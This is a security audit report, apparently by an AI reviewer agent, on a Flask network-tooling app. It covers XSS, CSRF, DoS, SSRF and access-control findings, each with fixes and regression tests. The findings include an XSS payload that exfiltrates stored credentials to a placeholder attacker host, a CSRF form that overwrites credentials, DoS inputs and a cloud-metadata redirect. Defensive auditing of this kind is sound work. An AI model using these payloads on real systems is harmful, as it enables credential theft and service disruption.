# DONE — Pergen Security Audit — 2026-04-22

**Reviewer:** security-reviewer agent (read-only audit, no code modified)
**Repo state:** post `parsers/` package refactor (Phase-13 hardening landed)
**Scope:** `backend/`, `backend/static/`, `backend/config/`, recent `backend/parsers/` refactor
**Tooling used:** ripgrep / grep sweep, `pip-audit` (against active venv), manual code review
**Out of scope already tracked:** 9 known xfail security tests (see §11) — only NEW issues are flagged below; existing xfails are cross-referenced where they cover a finding

---

## 0. Summary

| Severity | Count | Net new (not in xfails / refactor docs) |
|---|---|---|
| **CRITICAL** | 0 | 0 |
| **HIGH** | 7 | **5** |
| **MEDIUM** | 12 | **9** |
| **LOW** | 9 | **8** |
| **INFO** | 4 | 4 |

**Top 5 most exploitable** (ordered by realistic blast radius):

1. **HIGH — Stored XSS via inventory `fabric/site/hall/role` columns rendered into `<option>` tags without escape.** `backend/static/js/app.js:273, 284, 297, 311`. Inventory writes are open (no auth UI; `/api/inventory/device` POST in dev/test). Anyone who can write the inventory CSV can execute JS in any operator's browser. Already partially flagged in `docs/refactor/xss_innerhtml_audit.md` as the `UNSAFE` bucket (rows #2-#5), but the plan has not landed; this audit confirms exploitability and adds the find-leaf / NAT result rows below as **new** sites that the existing plan also identifies but that are still wide open today.
2. **HIGH — Stored XSS via `/api/find-leaf` and `/api/nat-lookup` results into result-table `innerHTML`.** `backend/static/js/app.js:4055, 4135, 4232, 4248`. `data.error`, `data.fabric`, `data.site`, `data.hall`, `data.leaf_hostname`, `data.leaf_ip`, `data.interface`, `data.firewall_hostname`, `data.firewall_ip`, `data.rule_name`, `data.translated_ips[]` are concatenated into HTML with no escape. Source includes inventory rows AND parsed device responses (Palo Alto rule names — operator-controlled but writable) — the latter is influence-able by anyone with `set rulebase nat rules entry "<img src=x onerror=...>"` access on any tagged firewall.
3. **HIGH — No CSRF protection on any state-changing endpoint.** Repo-wide grep: zero CSRF tokens, zero `Flask-WTF`, zero `SameSite` cookie config, no `Origin`/`Referer` checks. With the token gate **disabled** (default in dev/test/non-production), an attacker who lures an operator's browser to a malicious page can `fetch()` cross-origin to `http://127.0.0.1:5000/api/inventory/device` POST/PUT/DELETE, `/api/credentials` POST, `/api/transceiver/recover` POST, etc., because Flask issues no anti-CSRF cookie and CORS preflight is **not required** for `application/json` posts that a malicious page can craft as `text/plain` to dodge the preflight (and Flask still parses them via `request.get_json(force=…)` only — but `request.get_json(silent=True)` returns `None` on wrong Content-Type, which still leaves form-encoded CSRF on the GET-side intact). Existing plan `docs/refactor/spa_auth_ui.md` proposes CSRF as part of the cookie-session work but it's gated behind the SPA auth refactor — meaning **CSRF is unprotected in production today** for any deploy that uses `X-API-Token` (which authenticates the request but does not bind it to a user session, so a stolen token used in a cross-origin context still works).
4. **HIGH — `/api/diff` exposes worker-tying DoS vector even with the 256 KB cap.** `backend/blueprints/runs_bp.py:354`. `difflib.unified_diff` is O(n*m); 256 KB × 256 KB on `splitlines(keepends=True)` of pathological input (e.g. one-character lines) reaches ~10⁹ comparisons. Combined with the missing rate-limiter (no Flask-Limiter, no per-IP throttle on `/api/*`), a single attacker thread can burn all gunicorn workers. Existing `tests/test_security_diff_dos.py` covers the cap but not the per-line CPU explosion.
5. **HIGH — `/api/credentials` POST/DELETE accepts no auth in dev/test mode and writes to the encrypted credential DB.** `backend/blueprints/credentials_bp.py:75-110`. The token gate is opt-in (`PERGEN_API_TOKEN(S)` not set ⇒ open). The audit-log channel `app.audit` records the actor only when the gate is on — in dev/test the actor falls back to `"anonymous"` (`credentials_bp.py:42`) so a destructive credential overwrite is attributable to nobody. Combined with #3, an attacker who lands the operator on a malicious page can rotate every credential in the local store via cross-origin POSTs.

---

## 1. Methodology

- Read every file under `backend/blueprints/`, `backend/runners/`, `backend/services/`, `backend/repositories/`, `backend/security/`, `backend/parsers/`, `backend/config/`, plus `backend/app.py`, `backend/app_factory.py`, `backend/credential_store.py`, `backend/find_leaf.py`, `backend/nat_lookup.py`, `backend/bgp_looking_glass.py`, `backend/parse_output.py`, `backend/request_logging.py`, `backend/logging_config.py`, `backend/utils/ping.py`.
- Grep-swept for `subprocess`, `os.system`, `os.popen`, `shell=True`, `eval(`, `exec(`, `pickle`, `marshal`, `yaml.load(` (unsafe form), `verify=False`, `render_template_string`, `Markup`, `csrf`, `CORS`, `innerHTML`, raw SQL execute calls.
- Read SPA assets (`backend/static/index.html`, `backend/static/js/app.js`).
- Cross-checked every finding against the 9 known xfail tests under `tests/test_security_*.py` and the 10 plan documents under `docs/refactor/*.md`.
- Ran `pip-audit` against the active venv (see §10).

---

## 2. Sweep of dangerous primitives

| Primitive | Hits | Verdict |
|---|---|---|
| `subprocess` | 1 (`backend/utils/ping.py:37`, `subprocess.run(argv, capture_output=True, timeout=…)`) | **Safe.** No `shell=True`. `argv` built from validated IPv4 (`InputSanitizer.sanitize_ip` runs first at `network_ops_bp.py:89`). System `ping` resolved via `$PATH` (acknowledged with `# noqa: S607`). |
| `os.system` / `os.popen` | 0 | n/a |
| `shell=True` | 0 | n/a |
| `eval()` / `exec()` | 0 | n/a |
| `pickle` / `marshal.loads` | 0 | n/a |
| `yaml.load(` (unsafe) | 0 | Only `yaml.safe_load` is used (`backend/parsers/engine.py:74`, `backend/config/commands_loader.py:21`). |
| `render_template_string` / `Markup` | 0 | No Jinja templates rendered server-side; SPA is a static asset. |
| `verify=False` | 0 (only the `DEVICE_TLS_VERIFY = False` constant at `backend/runners/_http.py:20`, used for self-signed device certs) | **Acceptable** for device traffic but documented; **see M-1** about RIPEStat / PeeringDB calls. |
| `json.loads` on untrusted input | 14 sites (parsers, repositories) | **Safe.** `json.loads` cannot RCE in Python; every parser site wraps in `try/except`. |
| Raw SQL | 0 | All `conn.execute(…, (params,))` use parameter binding (`backend/credential_store.py:92,125,138`, `backend/repositories/credential_repository.py:116,130,175,192`). One `executescript` (`credential_repository.py:86`) is a static DDL string with no interpolation. |
| Raw HTML rendering | 0 server-side; **135 `innerHTML` sites client-side** (`backend/static/js/app.js`) — see §3.1. |
| `Markup`/`safe` Jinja filters | 0 | n/a (no Jinja). |
| `tempfile.mktemp` (TOCTOU race) | 0 | n/a |
| `os.urandom` / `secrets.token_bytes` | OK — uses `secrets` (`backend/security/encryption.py:301`). |

**Conclusion:** the server-side primitive surface is clean; all CRITICAL-tier RCE/SQLi vectors are absent. The remaining risk is concentrated in the SPA (XSS), CSRF, and missing rate-limiting.

---

## 3. Findings — ranked by severity

### 3.0 Severity definitions

- **CRITICAL** — direct unauthenticated RCE / privilege escalation / mass credential disclosure with default config.
- **HIGH** — exploitable in a realistic operator deployment without unusual prerequisites.
- **MEDIUM** — exploitable but requires either lateral access, an authenticated insider, or a chained precondition.
- **LOW** — defence-in-depth gap; no direct exploit path under the documented threat model.
- **INFO** — observability or hygiene comment, not a vulnerability.

---

### 3.1 HIGH

#### H-01 — Stored XSS via inventory dropdown columns (NEW; partially in `xss_innerhtml_audit.md` plan, not yet fixed)
**Files:** `backend/static/js/app.js:273, 284, 297, 311`
**Class:** OWASP A03 (Injection / XSS)
**Source of attacker-controlled value:** inventory CSV (`fabric`, `site`, `hall`, `role` columns), writable through `POST /api/inventory/device`, `PUT /api/inventory/device`, `POST /api/inventory/import`. Inventory writes have **no auth** in dev/test and only the bearer-token gate in production.
**Snippet:**
```js
fabricSel.innerHTML = "<option value=\"\">—</option>" + fabrics.map(f => `<option value="${f}">${f}</option>`).join("");
```
**Attack scenario:** Operator (or attacker post-#H-05) submits an inventory row with `fabric=" autofocus onfocus=alert(document.cookie) x="`. The string lands in the `<option value="…">` attribute of the Pre/Post-check page selector and executes the moment the select element receives focus (or via `onload` for an `<img>`-style payload sneaked into `<option>` HTML — Chrome/Firefox parse leftover tag content as text, so the more practical vector is `"><script>fetch('/api/credentials').then(r=>r.json()).then(c=>fetch('//attacker/'+JSON.stringify(c)))</script>` injected into a `fabric` cell).
**Fix:** wrap every interpolation in `escapeHtml(...)` (already used elsewhere in the same file). The plan in `docs/refactor/xss_innerhtml_audit.md` Phase 4 is the right delivery vehicle — this audit confirms the issue is still live and is reachable from the open inventory write API.
**Test (assert-style):**
```python
def test_loadFabrics_escapes_inventory_fabric_column(client, monkeypatch):
    # Seed an inventory CSV row whose fabric column carries a payload.
    payload = '"><img src=x onerror=window.__x=1>'
    seed_inventory(monkeypatch, fabric=payload, hostname="leaf-1", ip="10.0.0.1")
    # Hit /api/fabrics; assert the response value is the literal payload.
    r = client.get("/api/fabrics")
    assert payload in r.get_data(as_text=True)
    # Static-source assertion (mirrors tests/test_security_xss_spa.py):
    src = read_app_js()
    assert "escapeHtml(f)" in extract_function_body(src, "loadFabrics")
```

#### H-02 — Stored / reflected XSS in find-leaf and NAT result tables (NEW; in `xss_innerhtml_audit.md` plan as UNSAFE rows 11/13/14)
**Files:** `backend/static/js/app.js:4055, 4135, 4232, 4248`
**Class:** OWASP A03 (XSS)
**Snippet (4055):**
```js
resultBody.innerHTML = rows.map(function(r) {
  return "<tr><td>" + r[0] + "</td><td>" + (r[1] ? String(r[1]) : "") + "</td></tr>";
}).join("");
```
`r[1]` carries `data.leaf_hostname`, `data.leaf_ip`, `data.fabric`, `data.site`, `data.hall`, `data.interface` — all flowing from `/api/find-leaf` / `/api/find-leaf-check-device` JSON.
**Attack scenario:** A hostile firewall returns a Palo Alto NAT rule name containing HTML (or an inventory row with HTML in `hostname`/`hall`); the operator opens the find-leaf or NAT-lookup page; the payload executes in their browser. Since the gate-token is in `localStorage` for any future cookie-auth design (see `docs/refactor/spa_auth_ui.md`), credential exfil is one fetch call away.
**Fix:** route every `r[1]` (and the matching NAT/find-leaf rows) through `escapeHtml`. The dropdown-fix work and these table-row fixes can land together.
**Test:**
```python
def test_find_leaf_response_with_html_payload_is_escaped(playwright_page):
    page.route("**/api/find-leaf-check-device", lambda r: r.fulfill(json={
        "found": True, "leaf_hostname": "<img src=x onerror='window.__xss=1'>",
        "leaf_ip": "10.0.0.1", "fabric": "F1", "site": "S1", "hall": "H1",
        "interface": "Ethernet1/1", "checked_hostname": "h1",
    }))
    page.goto("/#findleaf")
    page.fill("#findLeafIp", "10.0.0.2")
    page.click("#findLeafBtn")
    page.wait_for_selector("#findLeafResult")
    assert page.evaluate("window.__xss") is None
    assert page.locator("img[src='x']").count() == 0
```

#### H-03 — No CSRF protection on any state-changing endpoint (NEW)
**Files:** repo-wide. No `Flask-WTF` import, no anti-CSRF middleware, no `SameSite` cookie attribute (Flask default in 3.x is `Lax` for the *session* cookie if used — but Pergen does not set any session cookie today, so the protection never triggers). No `Origin`/`Referer` validation in `request_logging.py`.
**Class:** OWASP A01 (Broken Access Control)
**Attack scenario:** Operator authenticates via `X-API-Token` from a desktop CLI tool that injects the header on every same-origin call. Attacker emails a phishing link `https://malicious/csrf.html`. The page issues `fetch('http://internal-pergen:5000/api/inventory/device', {method:'POST', body:'…', credentials:'include'})`. The `X-API-Token` is **not** sent (custom header → preflight required → CORS denies), **but** any same-origin script (e.g. an XSS landed via H-01) succeeds without the header. So CSRF in the strict sense isn't directly exploitable for token-gated deploys — **but** in dev/test (gate disabled) **every** state-changing route is CSRF-able from any cross-origin page that can craft a `text/plain`-typed JSON body, because Flask's CORS default is "no preflight required for simple requests" and the routes do not check `Content-Type`.
**Concrete dev/test vector:**
```html
<form action="http://victim-dev:5000/api/credentials" method="POST" enctype="text/plain">
  <input name='{"name":"root","method":"basic","username":"attacker","password":"x","extra":"' value='"}'/>
  <input type=submit value="Click here"/>
</form>
```
The body parses as JSON-ish (`request.get_json(silent=True)` returns `None`, but the route falls back to `data = {}` — credentials write is then a 400, not a write). However, the **same** form trick succeeds against `/api/inventory/device` and `/api/notepad` because they accept arbitrary JSON shapes. **Verify before remediation:** which routes accept `text/plain`-form-encoded JSON body — they're the in-scope targets.
**Fix:** Either (a) require `Content-Type: application/json` on every state-changing route (`request.is_json` check) **and** add a `SameSite=Strict` cookie binding (no cookie issued today, so this is wired together with the auth refactor), or (b) require a custom header (`X-Requested-With` or the existing `X-API-Token`) on every state-changing route — `before_request` rejecting POST/PUT/DELETE that lack it. (b) is the smaller-blast-radius fix and unblocks the existing `docs/refactor/spa_auth_ui.md` Phase 2.
**Test:**
```python
def test_inventory_post_rejects_text_plain_csrf_form(client):
    r = client.post(
        "/api/inventory/device",
        data='{"hostname":"x","ip":"1.2.3.4"}',
        content_type="text/plain",
    )
    assert r.status_code in (400, 415, 403)
```

#### H-04 — `/api/diff` per-line CPU explosion despite 256 KB byte cap (NEW)
**Files:** `backend/blueprints/runs_bp.py:336-361`
**Class:** OWASP A04 (Insecure Design — DoS), CWE-407
**Snippet:**
```python
diff = difflib.unified_diff(
    pre_text.splitlines(keepends=True),
    post_text.splitlines(keepends=True),
    fromfile="PRE", tofile="POST", lineterm="",
)
```
**Attack scenario:** Submit `pre = "a\n" * 130_000` and `post = "b\n" * 130_000`. Both are ≤256 KB so the byte cap passes. `difflib.unified_diff` runs in O(n*m) over 130 000 × 130 000 = 1.69·10¹⁰ char comparisons → multi-minute single-worker pin. Issue 4 such requests in parallel against a 4-worker gunicorn → full app DoS without authentication when the gate is disabled.
**Fix:** add a **line-count cap** in addition to the byte cap (e.g. 8 192 lines per side); reject above that with 413. Optionally swap to `difflib.unified_diff` only after a quick `SequenceMatcher.real_quick_ratio()` similarity check, OR move diffing to a worker thread with a hard timeout via `signal.alarm` (Linux only) / `concurrent.futures` cancellation.
**Test:**
```python
def test_diff_rejects_pathological_line_count(client):
    pre = "a\n" * 130_000   # ≤ 256 KB but huge n
    post = "b\n" * 130_000
    r = client.post("/api/diff", json={"pre": pre, "post": post})
    assert r.status_code == 413
    assert r.json["error"].startswith("diff inputs capped at")
```

#### H-05 — Open inventory + credential write in non-production (NEW context — partly addressed by `audit_logger_coverage.md`)
**Files:** `backend/blueprints/inventory_bp.py:154-191`, `backend/blueprints/credentials_bp.py:75-110`, `backend/blueprints/notepad_bp.py:43`, `backend/blueprints/transceiver_bp.py:128, 286` (recover/clear-counters).
**Class:** OWASP A01 (Broken Access Control)
**Issue:** All write routes default to **OPEN** when neither `PERGEN_API_TOKEN` nor `PERGEN_API_TOKENS` is set (`backend/app_factory.py:240-248` — the gate logs one WARN and serves traffic). The dev-default WARN is correct but `run.sh` boots without setting either, so a freshly cloned repo's local instance accepts inventory writes, credential overrides, transceiver recovery, and notepad mutations from any source on the host. On a multi-user Mac/Linux box (or a leaky VPN), any process can hit `127.0.0.1:5000` and rewrite the inventory.
**Fix:** Require an env var (e.g. `PERGEN_DEV_OPEN_API=1`) for the open posture even in dev — refuse to boot otherwise. Print a one-time CLI banner (not just a WARN log line). The existing fail-closed in production (`app_factory.py:222-235`) is correct; this finding extends that posture to dev/test.
**Test:**
```python
def test_dev_boot_without_token_and_without_explicit_open_flag_refuses():
    monkeypatch.delenv("PERGEN_API_TOKEN", raising=False)
    monkeypatch.delenv("PERGEN_API_TOKENS", raising=False)
    monkeypatch.delenv("PERGEN_DEV_OPEN_API", raising=False)
    with pytest.raises(RuntimeError):
        create_app("development")
```

#### H-06 — Token gate re-reads env on every request (immutability) — covered by existing xfail
**Files:** `backend/app_factory.py:202-217, 239`
**Status:** **EXISTING xfail** — `tests/test_security_token_gate_immutable.py`, plan in `docs/refactor/token_gate_immutability.md`. No new content here; included for completeness so the audit count reflects the open risk.

#### H-07 — Legacy credential store path retained alongside new store (data bifurcation)
**Files:** `backend/credential_store.py` (still in use by 6 callers — see `docs/refactor/credential_store_migration.md` §2.4).
**Class:** A02 (Cryptographic Failures — weak KDF surface)
**Issue:** `_fernet()` (`credential_store.py:35-47`) derives the Fernet key with a single SHA-256 (no PBKDF2). The new `EncryptionService` (`backend/security/encryption.py`) uses PBKDF2 600k. Both backends remain alive simultaneously and hold disjoint credential sets in `instance/credentials.db` vs `instance/credentials_v2.db`. An attacker who reads either file can crack the legacy one with cheap GPU brute force on a weak `SECRET_KEY`. The new store is fine.
**Status:** plan exists (`credential_store_migration.md`). Audit confirms the legacy module is still imported at runtime and that **no migration command has been shipped** as of this audit. No new finding beyond what the plan describes; included so the count is honest.

---

### 3.2 MEDIUM

#### M-01 — RIPEStat / PeeringDB outbound calls have no timeout-on-DNS, no allow-list pin
**Files:** `backend/bgp_looking_glass.py:9-12, 50-56`
**Class:** A10 (SSRF), CWE-918
**Issue:** `requests.get(RIPESTAT_BASE + …)` resolves `stat.ripe.net` at request time. If a future operator overrides `/etc/hosts` or DNS to point that name elsewhere, the BGP routes become an SSRF surface. Existing `tests/test_security_bgp_routes_pin_ripestat_host.py` pins the hostname constant but does not verify resolution. `verify=True` is implicit (correct), but `allow_redirects=True` is also default — a redirect could land on an internal IP. Recommend `allow_redirects=False` and (for paranoia) post-resolve the IP and reject RFC1918/loopback before calling.
**Fix sketch:** central helper `_safe_get(url, *, allowed_hosts={"stat.ripe.net","www.peeringdb.com"})` that asserts the URL host is in the set and pins `allow_redirects=False`.
**Test:**
```python
def test_ripestat_redirect_to_internal_is_rejected(monkeypatch, requests_mock):
    requests_mock.get("https://stat.ripe.net/data/routing-status/data.json",
                      status_code=302, headers={"Location":"http://169.254.169.254/latest/meta-data/"})
    out = bgp_lg.get_bgp_status("AS13335")
    assert out["error"] is not None
    assert "169.254" not in str(out)
```

#### M-02 — `/api/run/result/<run_id>` returns full state with no scope check
**Files:** `backend/blueprints/runs_bp.py:364-369`
**Class:** A01 (Broken Access Control / IDOR)
**Issue:** Any caller who knows (or guesses) a `run_id` (UUID4 — 122 bits, infeasible to guess) can fetch the full PRE/POST state including command outputs that may carry sensitive interface descriptions, ARP tables, or BGP advertisements. Token-gate accepts any actor; there is no per-actor scoping (the `RunStateStore` does not record creator). Enumeration is impractical (UUID4) but a leaked log line containing the `run_id` becomes a session-wide credential.
**Fix:** record `created_by_actor` on `set/update`, refuse `get` from a different actor unless an explicit `admin` actor is configured.
**Test:**
```python
def test_run_result_rejects_actor_mismatch(client):
    monkeypatch.setenv("PERGEN_API_TOKENS", "alice:" + "a"*32 + ",bob:" + "b"*32)
    rid = post_pre_run(client, headers={"X-API-Token": "a"*32})  # alice
    r = client.get(f"/api/run/result/{rid}", headers={"X-API-Token": "b"*32})  # bob
    assert r.status_code == 403
```

#### M-03 — `/api/reports/<run_id>?restore=1` has the same IDOR shape (NEW)
**Files:** `backend/blueprints/reports_bp.py:45-70`
**Same class as M-02.** A `?restore=1` GET writes into the in-memory run-state store — i.e. a side-effect via a GET method, which violates HTTP semantics and dodges any future POST-only CSRF guards. The path-traversal guard in `ReportRepository._safe_id` (Phase 13) is correct.
**Fix:** require `POST` for `restore`; add the same `created_by_actor` scope check.
**Test:**
```python
def test_report_restore_rejects_get_method(client):
    r = client.get(f"/api/reports/{run_id}?restore=1")
    assert r.status_code == 405  # restore must be POST
```

#### M-04 — `transceiver_bp` reads `creds.get_credential` directly with `current_app.config["SECRET_KEY"]`, bypassing service abstraction (NEW)
**Files:** `backend/blueprints/transceiver_bp.py:160, 336`
**Issue:** Two routes drop down to the legacy module (`from backend import credential_store as creds`) instead of `app.extensions["credential_service"]`. This means the route reads from `instance/credentials.db` (legacy SHA-256) while the rest of the app reads from `instance/credentials_v2.db` (PBKDF2). Two consequences: (a) credentials created via the new HTTP CRUD never appear here → recovery / clear-counters silently fail; (b) credentials seeded only into the legacy DB by the migration backfill never get re-protected by the stronger KDF.
**Fix:** plumb `CredentialService` into `TransceiverService` (already on the credential-store-migration plan, Phase 2.4).
**Test:**
```python
def test_transceiver_recover_uses_credential_service_not_legacy_module(client):
    # Set a credential through the v2 service only.
    svc = client.application.extensions["credential_service"]
    svc.set("rec", method="basic", username="u", password="p")
    # Drop the legacy DB file — recover must still find the credential.
    os.remove(client.application.config["LEGACY_CREDENTIAL_DB"])
    r = client.post("/api/transceiver/recover", json={"device": …, "interfaces": ["Ethernet1/1"]})
    assert r.status_code != 400 or "no credential" not in r.json["error"]
```

#### M-05 — Path-traversal helper in `ReportRepository._safe_id` is correct **on the report file**, but the index file (`index.json`) is updated even after a malformed `run_id` was sanitised to the literal `"default"`, silently overwriting the `default` entry (NEW)
**Files:** `backend/repositories/report_repository.py:130-142`
**Issue:** `_safe_id("../etc/passwd")` returns `..etc_passwd` after `lstrip(".")` keeps the leading dots stripped — wait, `lstrip(".")` strips only LEADING dots from the entire string, not from each path component. For `../etc/passwd` → after `replace("/","_")` → `.._etc_passwd` → after `lstrip(".")` → `_etc_passwd`. Safe. But `_safe_id("")` returns `"default"`, which means `delete("")` and `save(run_id="")` will both touch the same `default.json.gz` file, giving an attacker a deterministic way to overwrite a report someone else may have under that synthetic id. Edge case, but worth a guard.
**Fix:** raise `ValueError` for empty/whitespace `run_id` instead of coercing to `"default"`.
**Test:**
```python
def test_report_save_rejects_empty_run_id():
    repo = ReportRepository(tmp_path)
    with pytest.raises(ValueError):
        repo.save(run_id="", name="x", created_at="...", devices=[], device_results=[])
```

#### M-06 — `notepad_repository.update` reads the old file, diffs lines, writes back — under the `_lock` (Phase 13 fix), but the `load()` it calls re-acquires the same lock with `RLock`-ish semantics? It uses `threading.Lock`, not `RLock`. Re-acquire under the same thread will **deadlock** (NEW)
**Files:** `backend/repositories/notepad_repository.py:97, 137-149`
**Issue:** `update()` enters `with self._lock`, then calls `self.load()` which is plain `os` access (no lock), then `self._save_unlocked()`. So no deadlock here. But `save()` uses `with self._lock:` then calls `self._save_unlocked()` — also fine. **However**, if a future contributor changes `_save_unlocked` back to `save()`, the `Lock` re-entry will hard-deadlock the worker. Recommend switching to `threading.RLock` defensively; the cost is a few ns per acquire.
**Fix:** `self._lock = threading.RLock()`.
**Test:**
```python
def test_notepad_update_does_not_deadlock_on_recursive_save():
    repo = NotepadRepository(tmp_path)
    repo._lock = threading.Lock()  # what the file uses today
    # Patch _save_unlocked to call save() (the future regression)
    repo._save_unlocked = repo.save
    # Should not deadlock; an RLock would let it through, current Lock would hang.
    with pytest.raises(RuntimeError):  # or use a timeout helper
        timeout(2, repo.update, "x", "u")
```

#### M-07 — `request_logging.audit_log` is unused and produces a free-form string (NEW context — covered by existing plan)
**Files:** `backend/request_logging.py:119-157`
**Status:** Tracked in `docs/refactor/audit_logger_coverage.md`. No new content.

#### M-08 — Inventory write routes leak whether a hostname/IP exists via 200 vs 400 ("already exists") (NEW)
**Files:** `backend/services/inventory_service.py:160-163, 192-198`
**Class:** A04 (Insecure Design — enumeration)
**Issue:** Distinguishable error messages let a CSRF-enabled attacker (see H-03) enumerate the inventory by trying `POST` with hostnames and reading the 400 vs 200. Operationally minor; weight comes when chained with H-01 (use enumerated hostnames as XSS payload targets).
**Fix:** uniform 400 ("validation failed") response for the dev-open posture; keep the more useful response only when actor != anonymous.
**Test:**
```python
def test_inventory_add_unique_violation_does_not_disclose_existing_name(client):
    seed_inventory(client, hostname="leaf-99")
    r = client.post("/api/inventory/device", json={"hostname":"leaf-99", "ip":"10.0.0.1"})
    assert r.status_code == 400
    assert "leaf-99" not in r.get_data(as_text=True)
```

#### M-09 — `find_leaf` parallel `ThreadPoolExecutor(max_workers=min(len, 32))` has no `with` cancellation on first hit
**Files:** `backend/find_leaf.py:303-317`
**Class:** A04 / resource exhaustion
**Issue:** First match `break`s out of the loop but does not cancel pending futures — they continue to run, hold open SSH/eAPI connections, and consume threads / device sessions. With 30 leaf-search devices and the gate disabled, an attacker can fan out 30×N requests cheaply.
**Fix:** call `executor.shutdown(wait=False, cancel_futures=True)` (Python 3.9+) inside the break path; even better, switch to `asyncio.gather(..., return_exceptions=True)` with explicit `task.cancel()`.
**Test:**
```python
def test_find_leaf_cancels_pending_runners_on_first_hit():
    completed = []
    def fake_query(dev, *a, **kw):
        completed.append(dev["hostname"])
        return None if dev["hostname"] != "first-hit" else {...}
    with patch_query(fake_query):
        find_leaf("10.0.0.1", ...)
    # All 30 devices ran today; only ~few should run after cancellation.
    assert len(completed) < 5
```

#### M-10 — `TransceiverService` is reconstructed on every `/api/transceiver*` request (NEW)
**Files:** `backend/blueprints/transceiver_bp.py:46-50`
**Issue:** `_service()` returns `TransceiverService(secret_key=…, credential_store=creds)` on every call — no caching. Each construction is cheap, but it also pulls `current_app.config["SECRET_KEY"]` into a worker-local instance and the `secret_key` lives on the heap until the GC collects it. Defence-in-depth: better to grab the singleton from `app.extensions` (already the pattern for every other service).
**Fix:** register `TransceiverService` in `app_factory._register_services` and read it like the others.

#### M-11 — `ssh_runner.run_command` returns `str(e)` to the caller (`backend/runners/ssh_runner.py:95`) (NEW)
**Class:** A09 (Security Logging & Monitoring Failures — info disclosure via error)
**Issue:** Connection errors include host, port, username, and sometimes the supplied bad password tail in paramiko's exception strings. The blueprint then echoes this `err` field back to the operator (`device_commands_bp.py:264`, `bgp_bp.py`, `network_lookup_bp.py`). If a future SSH library upgrade widens the exception text (e.g. includes an environment dump), the change leaks immediately.
**Fix:** map paramiko exceptions to a controlled vocabulary (`{auth_failed, network, timeout, banner_mismatch, other}`) before returning. Server-side log keeps the original `repr(e)`.
**Test:**
```python
def test_ssh_runner_error_does_not_echo_credential_substring(monkeypatch):
    monkeypatch.setattr(paramiko.SSHClient, "connect",
                        lambda *a, **kw: (_ for _ in ()).throw(Exception(f"auth fail user={kw['username']}")))
    out, err = ssh_runner.run_command("1.2.3.4", "alice", "secret-password", "show ver")
    assert err is not None
    assert "secret-password" not in err
    assert "alice" not in err
```

#### M-12 — `_get_credentials` accepts a `credential_name` from `device.get("credential")` and runs `InputSanitizer.sanitize_credential_name` — but the inventory-bind helpers do **not** re-validate after lookup (NEW)
**Files:** `backend/runners/runner.py:27-54`, `backend/blueprints/runs_bp.py:43-66`
**Issue:** `_resolve_inventory_device` matches by `hostname` or `ip`, but does not enforce that the inventory's `credential` column passes `sanitize_credential_name`. A malformed CSV row (or a future inventory writer that bypasses the service-layer validator) can write `credential=' OR 1=1 --` into the CSV. The sanitiser still kicks in at `_get_credentials`, but only because the runner re-resolves through the legacy module — fragile coupling. Tighten by validating at inventory load time and refusing the row.
**Fix:** add `sanitize_credential_name` to `InventoryRepository.load()` per-row check; drop rows that fail.

---

### 3.3 LOW

#### L-01 — `index.html` ships `style-src 'unsafe-inline'` (CSP defence-in-depth)
**Files:** `backend/request_logging.py:99` — CSP includes `style-src 'self' 'unsafe-inline'`.
**Issue:** required because the page uses inline `<style>` blocks; correct for current SPA. Recommend extracting all styles into `static/css/app.css` so `'unsafe-inline'` can be dropped.

#### L-02 — `Strict-Transport-Security` header is set on **every** response, including HTTP responses bound to localhost (NEW)
**Files:** `backend/request_logging.py:90-92`
**Issue:** HSTS over HTTP is ignored by browsers, so harmless — but a curl-friendly developer who later proxies via a public hostname could be locked into HTTPS-only with a 2-year max-age. Set HSTS only when the request scheme was HTTPS.

#### L-03 — `Permissions-Policy` is set defensively but does not include `interest-cohort=()`, `payment=()`, etc. — minor hardening miss.
**Files:** `backend/request_logging.py:84-85`

#### L-04 — `secrets.token_bytes` is used for IVs, but `secrets.SystemRandom` is not seeded explicitly — fine in CPython, document as relying on `os.urandom`.

#### L-05 — `notepad_bp` 413 ("content exceeds maximum size") echoes the limit (`512_000`) back to the caller — disclosure of internal cap is acceptable; flagged for completeness.

#### L-06 — `report_repository._INDEX_CAP = 200` silently drops oldest entries; an attacker with write access could push 201 reports to evict an inconvenient one (NEW)
**Files:** `backend/repositories/report_repository.py:23, 122, 184`
**Issue:** The cap is enforced on every save, so an attacker with `/api/run/pre/create` access can flush the index. Add an `audit.log("report.evict", evicted_id=…)` call when an entry rolls off.

#### L-07 — `_install_api_token_gate` exempt set is hard-coded; no way for an operator to add a custom liveness probe path (NEW; minor extensibility)
**Files:** `backend/app_factory.py:199`

#### L-08 — `RunStateStore.get()` deep-copies the whole state on every request (`copy.deepcopy(value)`); for large device-result payloads this is multi-MB per call (NEW)
**Files:** `backend/services/run_state_store.py:63`
**Issue:** Performance, not security — but `deepcopy` over an attacker-supplied JSON tree (the SPA can stuff arbitrary device_results into `/api/run/pre/create`) is one of the more amplification-friendly DoS paths once H-03 is closed. Consider returning a frozen `MappingProxyType` view or `json.loads(json.dumps(value))` (faster than `deepcopy` for plain JSON).

#### L-09 — `nat_lookup` `_format_translated_address_response` uses manual XML escape via `replace()` chain — correct but fragile; recommend `xml.sax.saxutils.escape` (NEW)
**Files:** `backend/nat_lookup.py:91-111`
**Issue:** Output XML is for debug echo only, so the impact is limited; still, prefer the stdlib helper.

---

### 3.4 INFO

- **I-01:** `pip-audit` against the active venv reports **3 advisories on `pip` itself** (the package manager, not a runtime dependency): `CVE-2025-8869`, `CVE-2026-1703`, `ECHO-7db2-03aa-5591`. These do not affect runtime; upgrade the venv's `pip` to ≥ 26.0 in CI to silence the scanner.
- **I-02:** `pip-audit -r requirements.txt -r requirements-dev.txt` reports **no known vulnerabilities** in declared dependencies (Flask, cryptography, paramiko, requests, defusedxml, PyYAML, Werkzeug, pytest, etc.). Good.
- **I-03:** SSH host-key policy default is `AutoAddPolicy` (`backend/runners/ssh_runner.py:35-39`). Documented and behind opt-in `PERGEN_SSH_STRICT_HOST_KEY=1`. Acceptable for the current threat model; loud one-shot WARN is appropriate.
- **I-04:** The new `backend/parsers/` package refactor is **clean** — pure functions over device API output, no I/O, no `eval`, no dynamic imports. The `Dispatcher` registry is a static dict. The `GenericFieldEngine.apply()` does call `json.loads` on string device output, but that is exactly what the legacy code did, with the same safety profile (Python's `json.loads` cannot trigger code execution). **No new attack surface introduced.**

---

## 4. Findings → existing xfail / plan mapping

| Finding | Already covered by | Status |
|---|---|---|
| H-01 (XSS dropdowns) | `docs/refactor/xss_innerhtml_audit.md` rows #2-#5 (UNSAFE bucket) | Plan ONLY; **NEW**: confirms exploitability via open inventory writes |
